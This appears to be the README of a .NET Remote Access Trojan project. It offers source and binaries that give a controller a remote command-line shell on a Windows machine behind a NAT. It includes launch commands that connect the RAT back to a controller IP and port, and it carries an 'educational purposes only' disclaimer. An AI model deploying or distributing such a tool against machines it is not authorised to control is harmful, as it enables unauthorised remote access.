# Remote Access Trojan (RAT) 
# Build In .NET Socket's
`For Windows`

Client-server binaries and source-code for controlling a remote machine behind a NAT with a command-line shell in Windows. Although the core provides support for communication with multiple RATs, the command-line interface used has limited capabilities distinguishing each one.
The RAT process executable does not hide itself from taskbar or task manager as it was developed for educational purposes only. Please do not use for any malicious purposes.
- source code 
-  two binaries packed in ILMerge.

Replication of RAT:

1. Start the server in a command-line acting as the RAT (Binaries\rat.exe) -> 
rat ip=[controller-ip-address] port=[controller-port-default-is-9999]

2. Start the client in a command-line acting as the controller (Binaries\controller.exe) -> 
controller ip=[listen-ip-address] port=[listen-port-default-is-9999]

3. Issue commands from the controller.exe interface


`This tool is in developement phase so, apologies for encounter with Bugs.`
